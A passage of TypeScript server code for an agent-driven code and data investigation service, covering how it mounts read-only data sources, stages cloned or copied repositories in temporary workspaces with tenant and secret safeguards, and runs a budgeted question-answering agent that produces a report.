  const selSources = scopeSourcesToSelection(runWs(run).sources, { planeFilter: run.planeFilter ?? null });
  for (const s of [...selSources, ...envMcpSources()]) {
    if (s.kind === 'warehouse' && !whMounted) {
      // Box-style: an SA-key ref → resolve at run time → in-process BigQuery MCP (no stored secret,
      // no external bq-mcp). Falls back to an HTTP warehouse MCP (mcpUrl) when there's no ref.
      if (s.saJson) {
        ds.push(makeBigQuerySource({ saKey: s.saJson })); planes.push({ serverName: 'warehouse', kind: 'warehouse', exposes: PLANE_EXPOSES.warehouse }); whMounted = true;
      } else if (s.mcpUrl) {
        ds.push(makeWarehouseSource({ mcpUrl: s.mcpUrl, mcpToken: s.mcpToken })); planes.push({ serverName: 'warehouse', kind: 'warehouse', exposes: PLANE_EXPOSES.warehouse }); whMounted = true;
      }
    }
    if (s.kind === 'keyvalue' && s.mcpUrl && s.status !== 'error' && !kvMounted) { ds.push(makeRedisSource({ mcpUrl: s.mcpUrl, mcpToken: s.mcpToken })); planes.push({ serverName: 'redis', kind: 'keyvalue', exposes: PLANE_EXPOSES.keyvalue }); kvMounted = true; }
  }
  // On-demand repo-grep plane: a read-only REST-API reader so the agent can reach org repos NOT in the mounted
  // clone (e.g. acme/mobile-app). Credential is PER-ORG — THIS org's own connected github source: prefer its
  // full-access PAT (tokenRef) over a narrow App install so repo-grep reaches ALL of the org's repos, but scoped to
  // the org's OWN secret (a 2nd org uses ITS token, never another org's — multi-org-safe). defaultOrg is derived from the
  // source's own repos, not hard-coded. No clone. (repogrep)
  const ghSrc = runWs(run).sources.find((s) => s.kind === 'github');
  if (ghSrc) {
    ds.push(makeRepoGrepSource({
      getToken: async () => tokenForRun(ghSrc),
      defaultOrg: ghSrc.repos?.[0]?.fullName?.split('/')[0],
    }));
    planes.push({ serverName: 'repogrep', kind: 'repo', exposes: PLANE_EXPOSES.repogrep });
  }
  // On-demand org-memory plane: READ (memory_recall) + WRITE (memory_write) of this org's durable knowledge, via the
  // backend intake spine (new facts added directly, reinforcements append-merged; every write logged + revertable). This is the FIRST write-capable
  // tool in accel-mini, so it is STRICTLY OPT-IN behind ACCEL_MEMORY_WRITE_ENABLED (default OFF): unset/false ⇒ no
  // memory plane is mounted at all and behavior is unchanged. Per-org — orgIdForTenant scopes it to THIS tenant's org.
  // Two-key gate: ACCEL_MEMORY_WRITE_ENABLED is the DEPLOYMENT master switch; run.writeMemory is the PER-RUN control
  // (the "Write learnings to memory" tick on the ask). Both must be true to mount the write-capable memory tools.
  // The run id is passed so this run's writes are attributable (source.run_id) — the post-run Memory surface fetches
  // /api/memory/history?run_id=<run.id> to show what got added.
  if (agentMemoryWritesEnabled() && run.writeMemory === true) {
    const memOrgId = run.orgId ?? orgIdForTenant(run.tenant);
    if (memOrgId) {
      // A Quick Ask's memory_write may tag only the repos the ask selected (dropped tags are logged); other runs unchanged.
      ds.push(makeOrgMemorySource({ orgId: memOrgId, runId: run.id, actor: run.createdBy, ...(run.kind === 'ask' ? { allowedRepos: (run.askRepos ?? []).map((r) => r.fullName), log: (m: string) => pushLog(run, m) } : {}) }));
      planes.push({ serverName: 'orgmemory', kind: 'memory', exposes: PLANE_EXPOSES.orgmemory });
    }
  }
  return { mcpServers: ds.length ? mergeAgentTools(ds).mcpServers : undefined, planes };
}


// CONCRETE identity of each connectable measure plane (checkpoint/resume):
// `fp` hashes the mount COORDINATES **and the credential identity** (SA-key ref / token REF / the
// pasted token value — all hashed, never stored raw): kind-level matching would accept a staging
// warehouse swapped in for the prod one, and coordinate-only matching would accept the SAME MCP url
// re-authenticated as a DIFFERENT org (a tenancy boundary failure). `ref` carries the secret
// name (when that's the credential) so the resume gate can verify it still RESOLVES; `srcId` lets the
// mount loop filter to the parent's exact set. Mirrors the mount conditions in orgCritiqueExpert.
// PUBLIC-ONLY OSV auto-mount predicate — ONE function shared by the mount site (orgCritiqueExpert) and the
// resume fail-closed gate (POST /api/runs resumeFrom) so the two can never drift. True only when the run
// scans public giturl targets AND the workspace has NO other source of ANY kind: any credentialed/private
// plane (github → repogrep, local folders, warehouse/analytics/bi/custom/slack/gcp/box) coexisting in the
// same agent session could hand private dependency inventory to the OSV tools. Anything
// less than giturl-only needs the explicit THERESA_OSV=1 opt-in.
// Scope only — NOT memory. Org-memory recall could ALSO carry a private project's dependency
// coordinates into the same prompts as the OSV tools, but coupling that into this predicate made the
// intended public-URL full-scan path unreachable from the default UI (which always pushes useMemory:true).
// Instead the two are made MUTUALLY EXCLUSIVE at the recall site: a public-only-scope run auto-mounts OSV
// and SUPPRESSES org-memory recall (see executeOrgRun). So this stays a pure scope check.
// Whether the built-in OSV plane would ACTUALLY mount for this run — the allow predicate AND the
// mergeAgentTools name race: mergeAgentTools keeps the FIRST source of a duplicate server name and the
// built-in OSV is appended LAST, so a user plane already named `osv` wins and the built-in is skipped.
// The mount site records the post-merge truth from runPlanes; the resume gate (which can't run the merge)
// uses THIS predictor, and the two agree because a name collision is the only way an allowed mount is skipped.
function osvWouldMount(run: { giturlFilter?: string[] | null; repoFilter?: string[] | null; localFilter?: string[] | null }, sources: Source[]): boolean {
  const allowed = osvPublicOnly(run, sources) || process.env.THERESA_OSV === '1';
  // A collision only skips the built-in if the colliding source ITSELF mounts — the generic-MCP mount loop
  // skips status:'error' sources (a coords-only profile awaiting reconnect), so an errored `osv`-named source
  // is NOT a real collision. (This predictor's THERESA_OSV path is local-machine only,
  // where resume plane-skipping doesn't apply — the only collision vector is a live user MCP named `osv`.)
  return allowed && !sources.some((s) => (s.mcpName ?? '') === 'osv' && s.status !== 'error');
}





// Sanitize a UI repo selection ("owner/name" or "owner/name@branch") into typed entries (capped); empty ⇒ fallback.
// Shared by /api/ask + /api/audit so a bad payload can't explode the clone fan-out.
function parseRepoSelection(raw: unknown, fallback: { fullName: string; branch?: string }[]): { fullName: string; branch?: string }[] {
  if (!Array.isArray(raw) || !raw.length) return fallback;
  const seen = new Set<string>();
  const out: { fullName: string; branch?: string }[] = [];
  for (const r of raw.slice(0, 60)) {
    const s = String(typeof r === 'string' ? r : ((r as { fullName?: string })?.fullName ?? '')).trim();
    const m = s.match(/^([\w.-]+\/[\w.-]+)(?:@([\w./-]+))?$/);
    if (!m || seen.has(m[1])) continue;
    // A branch (object form or "@branch" suffix) is word characters, '.', '/' and '-' only, never leading '-' or '..'.
    const objBranch = typeof r === 'object' ? String((r as { branch?: unknown })?.branch ?? '').trim() : '';
    const want = objBranch || m[2] || '';
    const branch = want && /^[\w./-]+$/.test(want) && !want.startsWith('-') && !want.includes('..') ? want : undefined;
    seen.add(m[1]); out.push({ fullName: m[1], branch });
  }
  return out.length ? out : fallback;
}

// Dep/build dirs the agent never needs to read — skipped on the local-copy path so a multi-repo scan stays fast.
const REPO_COPY_SKIP = /(^|\/)(node_modules|\.venv|venv|env|__pycache__|\.pytest_cache|\.mypy_cache|\.ruff_cache|dist|build|\.next|\.turbo|\.gradle|target)(\/|$)/;
// Copy ONE local repo into `workspace` as a read-only snapshot, skipping dep/build dirs and symlinks (the
// agents' Glob/Grep don't follow symlinks, and a link escaping the tree — e.g. → ~/.ssh — must never enter the
// workspace). Returns the dest path on success, or null on a bad/empty copy. Same staging the org audit uses,
// so accel-mini scans local folders identically.
function copyRepoSnapshot(workspace: string, repo: { path: string; name: string }, log: (m: string) => void): string | null {
  const { dir: dest, name } = uniqueChildDir(workspace, repo.name);
  log(`copying local folder ${name} (read-only snapshot, skipping deps) …`);
  try {
    cpSync(repo.path, dest, { recursive: true, dereference: false, filter: (src) => {
      if (src !== repo.path && REPO_COPY_SKIP.test(src.slice(repo.path.length))) return false;  // SKIP relative to repo root
      if (src !== repo.path && isLocalSecretPath(src)) return false;
      try { if (lstatSync(src).isSymbolicLink()) return false; } catch { /* keep */ }
      return true;
    } });
    if (!readdirSync(dest).length) { log(`  ⚠ ${repo.name} copied EMPTY — skipped (bad path?)`); rmSync(dest, { recursive: true, force: true }); return null; }
    return dest;
  } catch (e) { log(`  skipped ${repo.name}: ${e instanceof Error ? e.message : String(e)}`); return null; }
}
// Resolve the read-only workspace the ask agent reads (cwd). accel-mini scans EVERY selected repo, not just the
// first — a multi-repo question (e.g. an org-wide secret scan) must see them all. Repos are CLONED (clone-on-run).
// `explicit` (Quick Ask — run scope is explicit): ONLY run.askRepos (cloned) + run.askLocal (the selected connected
// local folders, COPIED alongside); an empty selection returns {} (the caller runs a code-less ask) and nothing falls
// back to the box profile's repos or to other connected local folders. Without it (report chat) the legacy fallbacks
// stay: the box profile's auditRepos, then ALL connected local folders COPIED when no repo cloned.
// `skipped` names each selected repo that could not be staged (the caller records it as degraded).
async function resolveAskRoot(run: Run, explicit = false): Promise<{ root?: string; cloneDir?: string; fail?: string; skipped?: string[] }> {
  let selectedLocal: { path: string; name: string }[] = [];
  if (explicit && run.askLocal?.length) {
    const { folders, missing } = resolveAskLocalFolders(run.askLocal, runWs(run).sources);
    for (const id of missing) pushLog(run, `  skipped local folder ${id}: no longer connected`);
    selectedLocal = folders;
  }
  const localRepos = explicit ? [] : (runWs(run).sources.find((s) => s.kind === 'local')?.localRepos ?? []);
  const repos = run.askRepos ?? [];
  if (!repos.length && !localRepos.length && !selectedLocal.length) return {};   // nothing selected / connected
  const workspace = mkdtempSync(join(tmpdir(), 'theresa-ask-'));
  let staged = 0;
  const skipped: string[] = [];
  // Quick Ask: the explicitly selected local folders, copied as read-only snapshots alongside any cloned repos.
  // Scope record (reportScope.ts) — explicit Quick Ask only (report chat's synthetic run is never persisted).
  const manifest: CodeManifest = { repos: [], local: [] };
  const publicNames = new Set(runWs(run).sources.filter((s) => s.kind === 'giturl').flatMap((s) => (s.giturlRepos ?? []).map((r) => r.fullName.toLowerCase())));
  for (const f of selectedLocal) { if (copyRepoSnapshot(workspace, f, (m) => pushLog(run, m))) { staged++; manifest.local.push(f.name); } else skipped.push(f.name); }
  const localStaged = staged;
  // Selected repos (clone-on-run) take priority — clone ALL of them into the workspace.
  if (repos.length) {
    const gh = runWs(run).sources.find((s) => s.kind === 'github');
    const token = gh ? await tokenForRun(gh) : undefined;
    // Observability: the clone credential + whether a token resolved, to
    // stdout (the per-clone pushLog lines are SSE-only). NEVER the token value — just type + length.
    console.log(JSON.stringify({ severity: 'INFO', component: 'run', run: run.id, tenant: run.tenant, event: 'ask-clone-cred', repos: repos.length, ghSource: Boolean(gh), tokenResolved: Boolean(token) }));
    for (const rp of repos) {
      const ref = parseRepoRef(rp.fullName); if (!ref) { pushLog(run, `  skipped ${rp.fullName}: unparseable repo ref`); skipped.push(rp.fullName); continue; }
      pushLog(run, `cloning ${rp.fullName}${rp.branch ? '@' + rp.branch : ''} …`);
      // Collision-free dest — two selected repos can share a basename across owners (the full-org picker spans
      // every org), and git clone into a non-empty dir would fail → the dupe would be silently skipped.
      try {
        const dest = uniqueChildDir(workspace, ref.fullName.split('/')[1] || 'repo').dir;
        await cloneRepo(ref.cloneUrl, token, dest, rp.branch); staged++;
        manifest.repos.push({ fullName: ref.fullName, sha: gitHeadSha(dest), public: publicNames.has(ref.fullName.toLowerCase()) });
      }
      catch (e) { pushLog(run, `  skipped ${rp.fullName}: ${e instanceof Error ? e.message : String(e)}`); skipped.push(rp.fullName); }
    }
    if (staged === localStaged && localRepos.length) pushLog(run, `  none of the ${repos.length} profile repo(s) cloned (GitHub not connected for this session?) — falling back to connected local folder(s)`);
  }
  // Report chat only: use ALL connected local folders (copied as read-only snapshots) when no repo cloned.
  if (!staged && localRepos.length) {
    for (const r of localRepos) { if (copyRepoSnapshot(workspace, r, (m) => pushLog(run, m))) staged++; }
  }
  if (explicit) updateRun(run, (r) => { r.codeManifest = manifest; });
  if (staged) { pushLog(run, `ask workspace ready · ${staged} repo(s) staged · root ${workspace}`); return { root: workspace, cloneDir: workspace, skipped }; }
  try { rmSync(workspace, { recursive: true, force: true }); } catch { /* best-effort */ }
  const named = repos.map((r) => r.fullName).join(', ');
  return { fail: `ask aborted: none of the ${repos.length + localRepos.length + selectedLocal.length} selected repo(s) / folder(s) could be staged — connect GitHub with read access${named ? ` to ${named}` : ''}, or deselect them, then retry.`, skipped };
}

// ── Per-conversation cloned-repo workspaces for the chat's read-only repo access ───────────────────────
// A chat turn is per-message; cloning the org's repos on every turn would be slow, so clone ONCE on a
// conversation's first turn and reuse the workspace across its turns. Wiped on conversation delete, on idle
// TTL, and capped. (Lost on process restart, leaving orphaned tmp dirs — bounded by the cap within an
// instance's life; the OS tmp reaper collects the rest. Same clone-then-wipe primitives as the Ask path.)
interface ChatAccess { root?: string; cloneDir?: string; mcpServers?: Record<string, unknown>; planeNames: string[]; reportContext?: string; at: number; org?: string }
// Keyed by `${tenant}:${convId}` — a clone is structurally inseparable from its tenant, so a guessed convId from
// another tenant can never address (or wipe) it.
const chatWorkspaces = new Map<string, ChatAccess>();
const CHAT_WS_TTL_MS = 30 * 60 * 1000;   // reap idle longer than 30 min
const CHAT_WS_CAP = 40;                   // hard cap on concurrent cloned workspaces
const chatKey = (tenant: string, convId: string) => `${tenant}:${convId}`;
function wipeChatWorkspace(key: string): void {
  const w = chatWorkspaces.get(key);
  if (!w) return;
  chatWorkspaces.delete(key);
  if (w.cloneDir) { try { rmSync(w.cloneDir, { recursive: true, force: true }); } catch { /* best-effort */ } }
}
function getCachedReportContext(tenant: string, convId: string): string | undefined { return chatWorkspaces.get(chatKey(tenant, convId))?.reportContext; }
function setCachedReportContext(tenant: string, convId: string, ctx: string | undefined): void { const w = chatWorkspaces.get(chatKey(tenant, convId)); if (w && ctx) w.reportContext = ctx; }
function pruneChatWorkspaces(): void {
  const now = Date.now();
  for (const [k, w] of chatWorkspaces) if (now - w.at > CHAT_WS_TTL_MS) wipeChatWorkspace(k);
  if (chatWorkspaces.size > CHAT_WS_CAP) {
    for (const [k] of [...chatWorkspaces.entries()].sort((a, b) => a[1].at - b[1].at).slice(0, chatWorkspaces.size - CHAT_WS_CAP)) wipeChatWorkspace(k);
  }
}
// Report chat grounds each turn in the OPEN report (its embedded datapoints / text, cached per conversation). It is
// tool-free: no repo clone and no data plane — a question the report cannot answer is a Quick Ask.
async function resolveChatAccess(tenant: string, _orgId: string | null, convId: string): Promise<{ cwd?: string; mcpServers?: Record<string, unknown>; planeNames: string[] }> {
  const key = chatKey(tenant, convId);
  const cached = chatWorkspaces.get(key);
  if (cached) { cached.at = Date.now(); return { planeNames: [] }; }
  chatWorkspaces.set(key, { planeNames: [], at: Date.now() });
  pruneChatWorkspaces();
  return { planeNames: [] };
}

function saveAskTrace(run: Run, body: string): void {
  saveReport(run.id + '-trace', `<!doctype html><meta charset="utf-8"><title>accel-mini trace · ${escapeHtml(run.targetName)}</title><body style="margin:0;background:#1b140f;color:#f6efe6;font:13px/1.6 ui-monospace,Menlo,monospace"><pre style="white-space:pre-wrap;word-break:break-word;padding:20px;margin:0">${escapeHtml(redactSecrets(body))}</pre></body>`);
  if (reportExists(run.id + '-trace')) run.hasTrace = true;
}
async function executeAskRun(run: Run): Promise<void> {
  liveRun(run).abort = liveRun(run).abort ?? new AbortController();
  return withRunAbort(liveRun(run).abort!.signal, async () => {
  console.log(JSON.stringify({ severity: 'INFO', component: 'run', run: run.id, tenant: run.tenant, event: 'start', kind: 'ask', scope: run.askScope }));
  const question = run.askQuestion || '';
  // Cap each ask at the per-run budget, parity with the org/audit paths: runAgent reads the ambient
  // ledger and stops STARTING new agent work past the 80% line (and the investigate agent carries an SDK
  // maxBudgetUsd). Run health like the Full Scan: runLedgerHooks streams live spend into run.costUsd and
  // turns every degrade() / recordDegraded into a run.degraded row. Created BEFORE the title call so its cost counts.
  const askLedger = new BudgetLedger(runBudget(), runLedgerHooks(run, inProcessCtx));
  pushLog(run, `accel-mini · budget $${runBudget()}/run`);
  // Replace the crude question truncation with a Haiku-generated title. Fail-open: on any error /
  // empty result the run keeps the truncation it was created with. Runs before the heavy investigate work.
  // Skipped if the user already set a manual title override (run.renamed) — a human edit always wins.
  if (!run.renamed) {
    const gen = await withRunBudget(askLedger, 'discovery', () => generateRunTitle(question, liveRun(run).authToken));
    if (gen) { updateRun(run, (r) => { r.targetName = gen; pushLog(r, `run title generated: ${gen}`); }); }
  }
  let cloneDir: string | undefined;
  try {
    // The repos the agent reads (cwd), read-only — EXACTLY the ask's selection (run scope is explicit): no fallback to
    // the org profile's repos, to connected local folders, or to a mid-run profile load. An empty selection is a
    // DATA-ONLY ask: the agent gets an empty scratch cwd (no code mounted) and answers from the selected planes.
    const r = await resolveAskRoot(run, true);
    cloneDir = r.cloneDir;
    if (r.skipped?.length) askLedger.degrade('ask-workspace', `${r.skipped.length} selected repo(s) / folder(s) could not be staged: ${r.skipped.slice(0, 5).join(', ')}${r.skipped.length > 5 ? ', …' : ''}`);
    if (r.fail) return failRun(run, r.fail);
    let root = r.root;
    if (!root) {
      root = cloneDir = mkdtempSync(join(tmpdir(), 'theresa-ask-nocode-'));
      pushLog(run, 'ask scope: no repos or folders selected — code not mounted');
    }

    if (liveRun(run).authToken) pushLog(run, `accel-mini runs on your Claude ${liveRun(run).authToken!.startsWith('sk-ant-oat') ? 'subscription' : 'API key'}`);
    // The read-only data planes (warehouse / key-value) this ask selected.
    const { mcpServers, planes } = await measurePlanesFor(run);
    pushLog(run, `accel-mini · investigate · root ${root}${planes.length ? ` · planes: ${planes.map((p) => p.serverName).join(',')}` : ''}`);

    // Investigate is the measure work ('bundle', gated); the report translate is 'reserve' so it always finishes.
    // Node-scoped memory PUSH: recall the org's scope-relevant cards once (version-pinned) and run
    // investigate inside withMemoryPush, so the investigate agent (memory-eligible) gets them appended to its
    // system prompt while toolFree writers/QC get nothing. Fail-open — no org / no memory ⇒ unchanged behavior.
    let memPushCore = '';
    const askOrgId = run.orgId ?? orgIdForTenant(run.tenant);
    const askRepos = (run.askRepos ?? run.auditRepos)?.map((r) => r.fullName);
    const askMemActive = Boolean(askOrgId) && memoryEnabled() && memoryPushEnabled() && run.useMemory !== false;
    if (askMemActive) {
      const { block, count, version, cards } = await execMemoryBrief(askOrgId!, run.askScope || '', question, { k: 8, actor: run.createdBy, repos: askRepos });
      memPushCore = block;
      if (block) {
        pushLog(run, `accel-mini · org-memory push: ${count} card(s) @ memory v${version}`);
        for (const line of memoryCardLines(cards)) pushLog(run, line);
      }
    }
    const askRecall = askMemActive ? { orgId: askOrgId!, actor: run.createdBy, repos: askRepos } : undefined;
    const investigated = await withMemoryRecall(askRecall, () => withMemoryPush(memPushCore, () => withRunBudget(askLedger, 'bundle', () => investigateQuestion({
      root, question, scopeDesc: run.askScope, mcpServers, planes,
      // Deep warehouse investigations (the feed-expose funnel) + the memory push + the final JSON dossier need
      // headroom. A higher cap only HELPS: fast asks still stop early when they answer; deep ones get room to
      // finish + emit the dossier. And if it STILL runs out, the safekeep salvage pass (scopedInvestigate)
      // assembles a partial dossier from the transcript rather than losing it. Bounded by the run budget ($100).
      maxTurns: 48,
      forceFixes: run.askFixes, authToken: liveRun(run).authToken, noCode: !r.root,
      log: (m) => pushLog(run, m),
      onFailTrace: (t) => saveAskTrace(run, `# accel-mini · ${question}\n\n${t}`),
    }))));
    if (!investigated) return failRun(run, 'the investigate agent produced no parseable answer — try rephrasing the question, or narrow the scope.');
    // Evidence gate (Full Scan parity): a file:line-shaped ref / tightening file that does not resolve in the
    // workspace is dropped before rendering; non-file refs (tables, queries, keys) are kept.
    let dossier = investigated;
    if (existsSync(root)) {
      const g = gateScopedEvidence(investigated, root);
      dossier = g.dossier;
      pushLog(run, `ask evidence: ${g.dropped.length} ref(s) dropped (not in the workspace)${g.dropped.length ? ` — ${g.dropped.slice(0, 6).join(', ')}${g.dropped.length > 6 ? ', …' : ''}` : ''}`);
    }
    run.askAnswer = dossier.answer; // surfaced to the chat bubble + /api/state so the bot replies inline
    if (dossier.truncated) askLedger.degrade('ask-investigate', 'the investigate agent stopped before its answer (turn or budget cap) — the report is a salvaged PARTIAL answer');
    // REPORT — the DETERMINISTIC scoped template (no report-authoring LLM, no extra LLM call). Meta: date = today,
    // `client` = the project's display name. The investigate agent answers in English, so the report is English.
    pushLog(run, `▶ stage:report · accel-mini · deterministic scoped template (no report-authoring LLM) · ${dossier.dataPoints.length} data point(s)${dossier.tightening?.length ? ` · ${dossier.tightening.length} tightening item(s)` : ''}`);
    const reportHtml = renderScopedReport(buildScopedReportModel(dossier, {
      client: run.targetName,
      scope: 'Quick Ask · ' + (run.askScope ?? 'single question'),
      date: new Date().toISOString().slice(0, 10),
      title: run.targetName, // the Haiku run title → the report h1 (already generated; no extra LLM call)
      log: (m) => pushLog(run, m),
    }));

    // accel-mini produces a scoped-template report, not a MinerResult, so finishRun (findings-shaped) doesn't apply —
    // replicate its completion tail directly: save report + a trace artifact, set status, emit `done`, persist.
    run.reportHtml = reportHtml; saveReport(run.id, reportHtml);
    const tally = Object.entries(dossier.toolTally).map(([k, v]) => `${k}: ${v}`).join('\n') || '(none)';
    const traceBody = `# accel-mini · ${question}\n\nroot: ${root}\nturns: ${dossier.turns} · cost: $${askLedger.spent().toFixed(2)}\n\n## tool tally\n${tally}\n\n## trace\n${dossier.trace}`;
    saveAskTrace(run, traceBody);
    if (liveRun(run).stopRequested) return stopRun(run);   // stop arrived after the last agent call (no throw) — finalize as stopped
    // QuickAsk memory: RECOGNIZE (not learn). Match this read-only ask against the seed patterns so the run page +
    // report can show "pattern recognized" + what a full scan would auto-check. No ledger write (findings=0 ⇒ no
    // mergeLedger, no save counts). Value-free: pattern titles + matched signal keywords only. Fail-open — never block
    // completion. Mirrors the finishRun computation (server.ts ~640) minus the mergeLedger step.
    try {
      const recogText = [question, run.askScope, dossier.answer].filter(Boolean).join('\n');
      const matched = patternsFor(recogText);
      if (matched.length) {
        const hay = recogText.toLowerCase();
        const signature = [...new Set(matched.flatMap((p) => p.appliesWhen).filter((s) => hay.includes(s.toLowerCase())))].slice(0, 5);
        run.recognized = { pattern: matched[0].title, signature, checks: matched.map((p) => p.title) };
      }
    } catch { /* recognition is best-effort — a read-only nicety, never fail the run over it */ }
    // Cost = the run ledger (title + investigate + salvage + translate), not a hand sum; past the cap ⇒ a 'budget'
    // degraded row, exactly as the Full Scan finish records it (budgetOverrunReason).
    const askCost = roundUsd(askLedger.spent());
    updateRun(run, (r) => {
      r.findings = 0; r.costUsd = askCost; r.status = 'complete';
      const overrun = budgetOverrunReason(askCost, runBudget());
      if (overrun) noteDegraded(r, 'budget', overrun);
    });   // terminal → release the lease (Ask completes directly, not via finishRun); mirrors finishRun
    console.log(JSON.stringify({ severity: 'INFO', component: 'run', run: run.id, tenant: run.tenant, event: 'complete', kind: 'ask', costUsd: run.costUsd }));
    const payload = JSON.stringify({ findings: 0, costUsd: run.costUsd, answer: run.askAnswer });
    for (const s of liveRun(run).subs) { sse(s, 'done', payload); s.end(); } liveRun(run).subs.clear();
    reportRunTelemetry(run, 'complete');
  } finally {
    liveRun(run).authToken = undefined; // never persist the BYO credential beyond the run (mirrors executeOrgRun's tail)
    if (cloneDir) { try { rmSync(cloneDir, { recursive: true, force: true }); } catch { /* best-effort */ } }
  }
  });
}
function addSource(t: OrgWorkspace, src: Source): void {
  // Singleton kinds (github/gcp/warehouse/keyvalue/slack) REPLACE by kind on reconnect. Generic MCP planes
  // (analytics/bi/custom) can coexist, so replace only the SAME id — re-adding one updates it, never clobbers a
  // sibling. local/box accumulate via their own paths, not addSource.
  const genericMcp = src.kind === 'analytics' || src.kind === 'bi' || src.kind === 'custom';
  for (let i = t.sources.length - 1; i >= 0; i--) {
    const dup = genericMcp ? t.sources[i].id === src.id : t.sources[i].kind === src.kind;
    if (dup) t.sources.splice(i, 1);
  }
  t.sources.push(src); persist();
}
async function connectGithub(body: any): Promise<Source> {
  const id = 'src_' + randomBytes(3).toString('hex');
  const token = String(body.token || '').trim();
  if (token) { const who = await whoami(token); const repos = await listReposWithOrgs(token); return { id, kind: 'github', name: 'GitHub', status: 'ready', detail: `${who} · ${repos.length} repos · read-only`, token, repos }; }
  const ref = parseRepoRef(String(body.repoRef || ''));
  if (!ref) throw new Error('Enter a GitHub token, or a public owner/repo (or repo URL).');
  return { id, kind: 'github', name: 'GitHub', status: 'ready', detail: `public · ${ref.fullName}`, repos: [{ fullName: ref.fullName, cloneUrl: ref.cloneUrl, private: false, defaultBranch: 'HEAD', pushedAt: '' }] };
}
// Warehouse plane: either a BigQuery service-account key (JSON, read-only role) mounted as an in-process read-only
// BigQuery MCP, or the URL of a read-only SQL MCP server. Credentials live in memory unless saved on this machine.
function connectWarehouse(body: any): Source {
  const id = 'src_' + randomBytes(3).toString('hex');
  const saJson = String(body.saJson || '').trim();
  if (saJson) {
    let sa: any; try { sa = JSON.parse(saJson); } catch { throw new Error('The service-account key is not valid JSON.'); }
    if (sa.type !== 'service_account' || !sa.client_email || !sa.private_key || !sa.project_id) throw new Error('Not a Google service-account key (expected type "service_account" with client_email, private_key and project_id).');
    return { id, kind: 'warehouse', name: 'BigQuery', status: 'ready', detail: `BigQuery · ${sa.project_id} · ${sa.client_email} · read-only`, saJson };
  }
  const mcpUrl = String(body.mcpUrl || '').trim();
  if (!mcpUrl) throw new Error('Paste a BigQuery service-account key, or the URL of a read-only SQL MCP server.');
  return { id, kind: 'warehouse', name: 'Warehouse SQL', status: 'ready', detail: redactUrlCredentials(mcpUrl).safe, mcpUrl, mcpToken: String(body.mcpToken || '').trim() || undefined };
}
// Read-only key-value / cache plane (e.g. a Redis MCP) — gives the Expert measure step a live KEY-VALUE
// plane (catalog/pool sizes via ZCARD, set membership) for metrics the warehouse can't answer. Same shape
// as the warehouse connector: mcpUrl is non-secret (persisted), the token is optional and never persisted.
function connectKeyValue(body: any): Source {
  const id = 'src_' + randomBytes(3).toString('hex');
  const mcpUrl = String(body.mcpUrl || '').trim();
  if (!mcpUrl) throw new Error('MCP URL required.');
  return { id, kind: 'keyvalue', name: 'Key-value (read-only)', status: 'ready', detail: redactUrlCredentials(mcpUrl).safe, mcpUrl, mcpToken: String(body.mcpToken || '').trim() || undefined };
}

// Generic read-only MCP data source (analytics / bi / custom) — Amplitude, Metabase, a product dashboard, any read-only MCP.
// The agentic run already MOUNTS these (makeMcpSource + the plane model); this lets the UI add one instead of the
// local env-mount (THERESA_OPERATOR_MCP_PLANES). mcpName = the server name the agent sees; exposes = a one-line
// plane hint; allowedTools = the EXACT read-only tool allowlist (host-side guard). mcpUrl/mcpName are non-secret.
// Server names owned by the built-in planes (mounted from their own connectors) — a user MCP must not normalize onto one
// of these or mergeAgentTools would silently drop a plane. ('amplitude'/'bidash' are env-mounted planes and a
// user naming theirs that is legitimate, so they are NOT reserved here.)
const RESERVED_MCP_NAMES = new Set(['warehouse', 'redis', 'slack']);

function connectMcp(body: any): Source {
  const id = 'src_' + randomBytes(3).toString('hex');
  const mcpUrl = String(body.mcpUrl || '').trim();
  if (!mcpUrl) throw new Error('MCP URL required.');
  const label = String(body.name || '').trim();
  // mcpName (the server name the agent sees) is derived from the label so the user only types `name  url` — no separate
  // server-id field. Light inference of kind from the name purely sets the plane label; all of analytics/bi/custom mount
  // identically. allowedTools omitted ⇒ the whole read-only MCP is trusted (mcpToolAllowed), same as our warehouse/redis.
  // mcpName must match makeMcpSource's /^[a-z][a-z0-9]*$/ (it is the mcp__<name>__ tool prefix; a hyphen/underscore or
  // leading digit would desync the SDK-sanitized prefix and the read-only guard would deny everything → a silent 0-call).
  // When the user gave no name, derive a friendly default from the URL host (so two unnamed entries on different hosts
  // don't both collapse to 'mcp'), and fall back to a per-URL hash so distinct URLs stay distinct.
  const hostLabel = (() => { try { const h = new URL(mcpUrl).hostname.replace(/^www\./, ''); const parts = h.split('.').filter((p) => p && !/^(mcp|api|app|www|com|io|ai|net|org|dev|co)$/.test(p)); return parts[0] || ''; } catch { return ''; } })();
  const urlHash = createHash('sha1').update(mcpUrl).digest('hex').slice(0, 4);
  let mcpName = normalizeMcpName(String(body.mcpName || '').trim() || label || hostLabel, urlHash);
  // Never let a user MCP shadow a built-in plane's server name (warehouse/redis/slack) — mergeAgentTools would keep the
  // first and silently drop the other. Suffix the user one so both mount.
  if (RESERVED_MCP_NAMES.has(mcpName)) mcpName = mcpName + urlHash;
  const lc = (label + ' ' + mcpName).toLowerCase();
  const kind: 'analytics' | 'bi' | 'custom' = body.kind === 'analytics' || body.kind === 'bi' || body.kind === 'custom' ? body.kind
    : /amplitude|mixpanel|analytic|event/.test(lc) ? 'analytics'
    : /metabase|looker|tableau|dash|bi\b|superset/.test(lc) ? 'bi' : 'custom';
  const allowedTools = (Array.isArray(body.allowedTools) ? body.allowedTools : String(body.allowedTools || '').split(/[\s,]+/))
    .map((t: unknown) => String(t).trim()).filter(Boolean);
  return {
    id, kind, name: label || ({ analytics: 'Analytics (MCP)', bi: 'BI & dashboards (MCP)', custom: 'Custom data (MCP)' })[kind],
    status: 'ready', detail: `${mcpName} · ${redactUrlCredentials(mcpUrl).safe}`, mcpUrl,
    mcpToken: String(body.mcpToken || '').trim() || undefined, mcpName,
    exposes: String(body.exposes || '').trim() || undefined,
    allowedTools: allowedTools.length ? allowedTools : undefined,
  };
}
// Local-folder source (local-machine only): discover the git repos in a folder (or its immediate
// subfolders) on THIS machine, read-only. Gated by LOCAL_AUDIT; never enable on a shared instance.
function connectLocal(rawPath: string): Source {
  if (!LOCAL_AUDIT) throw new Error('Local-folder audit is disabled on this instance (set THERESA_LOCAL_AUDIT=1 on the local machine).');
  const root = rawPath.replace(/^~(?=\/|$)/, process.env.HOME ?? '~').trim();
  if (!root || !existsSync(root) || !statSync(root).isDirectory()) throw new Error(`Not a folder on this machine: ${rawPath}`);
  const isRepo = (p: string) => existsSync(join(p, '.git'));
  const repos: { path: string; name: string }[] = [];
  if (isRepo(root)) repos.push({ path: realpathSync(root), name: basename(root) });
